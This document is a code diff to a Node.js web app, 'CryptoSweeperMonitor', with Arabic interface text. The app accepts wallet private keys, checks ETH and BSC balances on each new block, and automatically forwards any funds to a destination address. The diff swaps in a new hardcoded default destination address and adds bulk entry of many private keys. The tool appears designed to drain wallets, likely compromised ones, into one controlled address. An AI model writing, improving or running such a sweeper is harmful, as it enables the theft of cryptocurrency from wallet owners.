@@ -9,7 +9,7 @@ process.on('unhandledRejection', (reason, promise) => {
   console.error('❌ Promise مرفوض:', reason);
 });
 
-const DESTINATION_ADDRESS = process.env.DESTINATION_ADDRESS || '0xde402d9020cd1199fec486db70320f8f98ec5fec';
+const DESTINATION_ADDRESS = process.env.DESTINATION_ADDRESS || '0x9e47977653b80aA0D3a965Fb66369e2d0bAfB243';
 
 const RPC_URLS = {
   wallet1: {
@@ -26,13 +26,11 @@ class CryptoSweeperMonitor {
   constructor() {
     this.notifications = [];
     this.wallets = [];
-    this.maxWallets = 0;
+    this.maxWallets = 2;
     
-    if (RPC_URLS.wallet1.eth && RPC_URLS.wallet1.bsc) this.maxWallets = 1;
-    if (RPC_URLS.wallet2.eth && RPC_URLS.wallet2.bsc) this.maxWallets = 2;
-    
-    if (this.maxWallets === 0) {
+    if (!RPC_URLS.wallet1.eth || !RPC_URLS.wallet1.bsc) {
       this.addNotification('❌ خطأ: يجب تعيين ETH_URL1 و BSC_URL1 في متغيرات البيئة', 'error');
+      this.maxWallets = 0;
     } else {
       this.addNotification(`✅ يمكنك إضافة حتى ${this.maxWallets} محفظة`, 'info');
     }
@@ -61,8 +59,14 @@ class CryptoSweeperMonitor {
     this.addNotification(`🔗 [محفظة ${walletIndex}] الاتصال بـ ${networkName} (WebSocket)...`, 'info');
     
     const provider = new ethers.WebSocketProvider(providerUrl);
-    provider.websocket.removeAllListeners('error');
-    provider.websocket.on('error', () => {});
+    
+    provider.websocket.on('error', (err) => {
+      console.error(`WebSocket error [${networkName}]:`, err.message);
+    });
+    
+    provider.websocket.on('close', () => {
+      console.log(`WebSocket closed [${networkName}], reconnecting...`);
+    });
     
     const wallet = walletObj.wallet.connect(provider);
     
@@ -75,18 +79,22 @@ class CryptoSweeperMonitor {
     }
     
     provider.on('block', async (blockNumber) => {
-      const balance = await provider.getBalance(walletObj.address);
-      
-      if (balance > 0n) {
-        const balanceKey = balance.toString();
+      try {
+        const balance = await provider.getBalance(walletObj.address);
         
-        if (ignoredBalances.has(balanceKey) || isSending) {
-          return;
+        if (balance > 0n && !isSending) {
+          const balanceKey = balance.toString();
+          
+          if (ignoredBalances.has(balanceKey)) {
+            return;
+          }
+          
+          this.addNotification(`💰 [محفظة ${walletIndex}][${networkName}] رصيد جديد! ${ethers.formatEther(balance)}`, 'success');
+          
+          await this.forwardFunds(provider, wallet, balance, networkName, chainId, ignoredBalances, () => isSending, (val) => isSending = val, walletIndex);
         }
-        
-        this.addNotification(`💰 [محفظة ${walletIndex}][${networkName}] رصيد جديد! ${ethers.formatEther(balance)}`, 'success');
-        
-        await this.forwardFunds(provider, wallet, balance, networkName, chainId, ignoredBalances, () => isSending, (val) => isSending = val, walletIndex);
+      } catch (error) {
+        console.error(`خطأ في block listener [${networkName}]:`, error.message);
       }
     });
     
@@ -180,6 +188,7 @@ class CryptoSweeperMonitor {
       this.addNotification(`✅ [محفظة ${walletIndex}][${networkName}] تم! ${ethers.formatEther(amountToSend)}\n${explorerUrl}`, 'success');
       
       setSending(false);
+      ignoredBalances.delete(balance.toString());
       return true;
       
     } catch (error) {
@@ -202,8 +211,6 @@ class CryptoSweeperMonitor {
       const wallet = new ethers.Wallet(privateKey);
       const walletIndex = this.wallets.length + 1;
       
-      const rpcUrls = walletIndex === 1 ? RPC_URLS.wallet1 : RPC_URLS.wallet2;
-      
       const walletObj = {
         wallet: wallet,
         address: wallet.address,
@@ -215,7 +222,7 @@ class CryptoSweeperMonitor {
       
       this.addNotification(`✅ محفظة ${walletIndex} مضافة: ${wallet.address}`, 'success');
       
-      this.startMonitoringWallet(walletObj, rpcUrls);
+      this.startMonitoringWallet(walletObj, RPC_URLS.wallet1);
       
       return { success: true, message: `تم إضافة المحفظة ${walletIndex}` };
     } catch (error) {
@@ -484,18 +491,20 @@ app.get('/', (req, res) => {
         }
         
         async function addWallet() {
-            const privateKey = document.getElementById('newPrivateKey').value.trim();
+            const input = document.getElementById('newPrivateKey').value.trim();
             
-            if (!privateKey) {
+            if (!input) {
                 alert('الرجاء إدخال المفتاح الخاص');
                 return;
             }
+            
+            const privateKeys = input.split(/[\n,\s]+/).filter(key => key.length > 0);
             
             try {
                 const response = await fetch('/api/add-wallet', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ privateKey })
+                    body: JSON.stringify({ privateKeys })
                 });
                 
                 const result = await response.json();
@@ -534,12 +543,28 @@ app.post('/api/stop', (req, res) => {
 });
 
 app.post('/api/add-wallet', (req, res) => {
-  const { privateKey } = req.body;
-  if (!privateKey) {
+  const { privateKeys } = req.body;
+  
+  if (!privateKeys || privateKeys.length === 0) {
     return res.json({ success: false, message: 'الرجاء إدخال المفتاح الخاص' });
   }
-  const result = monitor.addWallet(privateKey);
-  res.json(result);
+  
+  const results = [];
+  let successCount = 0;
+  
+  for (const privateKey of privateKeys) {
+    const result = monitor.addWallet(privateKey.trim());
+    results.push(result);
+    if (result.success) successCount++;
+  }
+  
+  if (successCount === privateKeys.length) {
+    res.json({ success: true, message: `تم إضافة ${successCount} محفظة بنجاح` });
+  } else if (successCount > 0) {
+    res.json({ success: true, message: `تم إضافة ${successCount} من ${privateKeys.length} محفظة` });
+  } else {
+    res.json({ success: false, message: results[0].message });
+  }
 });
 
 app.listen(PORT, '0.0.0.0', () => {
